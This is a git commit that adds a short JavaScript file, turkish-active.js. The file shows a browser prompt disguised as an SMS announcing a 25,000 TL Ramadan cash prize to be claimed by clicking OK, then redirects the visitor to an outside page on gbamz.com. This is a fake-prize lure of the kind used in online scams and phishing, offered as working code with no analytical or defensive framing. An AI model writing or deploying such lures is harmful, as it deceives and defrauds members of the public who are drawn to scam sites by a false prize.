9d4fcb66af9662c0e0371f9ccd5681e4bdafe664
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-16 15:08:14 +0100

    Create turkish-active.js

---
+++ turkish-active.js
@@ -0,0 +1,5 @@
+var password = '25.000 TL ÇEKİN'
+password=prompt('SMS: Tebrikler, 25.000 TL Ramazan Kutlama Nakit Ödülünü almaya hak kazandınız, hemen almak için Tamam'a tıklayın','25.000 TL ÇEKİN');
+if (password != '25.000 TL ÇEKİN') {
+location.href='https://gbamz.com/ramadan-turkish.html';
+}
